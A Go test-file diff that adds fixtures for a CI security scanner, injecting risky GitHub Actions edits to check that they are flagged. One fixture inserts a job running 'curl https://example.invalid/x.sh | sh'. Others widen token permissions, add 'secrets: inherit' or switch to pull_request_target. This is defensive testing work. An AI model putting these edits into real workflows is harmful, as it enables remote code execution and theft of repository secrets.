@@ -32,12 +32,34 @@ func init() {
 			edit: edits(replaceInFile(embedded.WorkflowPath, "tripcord-pr.yml@"+embedded.WorkflowPin, "tripcord-pr.yml@main"), rerecord)},
 		"embed-manifest-future-schema": {kind: "positivos", tracked: true, args: embedArgs("--harness", "claude"),
 			edit: replaceInFile(embedded.ManifestPath, `"tripcord.embed/v1"`, `"tripcord.embed/v2"`)},
+		// A first embed whose pin no scanner knows, with embed.json's
+		// version above every release. The pin alone would be low in CI
+		// and for an older release; the workflow shape stays high.
+		"embed-unknown-pin-extra-job": {kind: "positivos", tracked: true,
+			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
+			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "      fail-on: high\n", "      fail-on: high\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n"))},
+		"embed-unknown-pin-permissions": {kind: "positivos", tracked: true,
+			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
+			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "      contents: read # checkout the repository being scanned\n      pull-requests: read # tripcord-pr.yml reads pull request reviews\n      security-events: write # upload the SARIF report\n", "      contents: write\n      id-token: write\n"))},
+		"embed-unknown-pin-secrets-inherit": {kind: "positivos", tracked: true,
+			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
+			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "    uses:", "    secrets: inherit\n    uses:"))},
+		"embed-unknown-pin-pull-request-target": {kind: "positivos", tracked: true,
+			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
+			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "  pull_request:\n", "  pull_request_target:\n"))},
 	} {
 		if _, dup := cfg016Fixtures[name]; dup {
 			panic("cfg016Fixtures: " + name + " twice")
 		}
 		cfg016Fixtures[name] = fx
 	}
+}
+
+// firstIntroduction is an embed whose tripcord.yml pin no Tripcord
+// wrote, after edit, with the digests re-recorded the way that init
+// would have written them.
+func firstIntroduction(edit func(*testing.T, string)) func(*testing.T, string) {
+	return edits(edit, repinWorkflowTo(strings.Repeat("a", 40)), rerecord)
 }
 
 func repinWorkflowTo(pin string) func(*testing.T, string) {
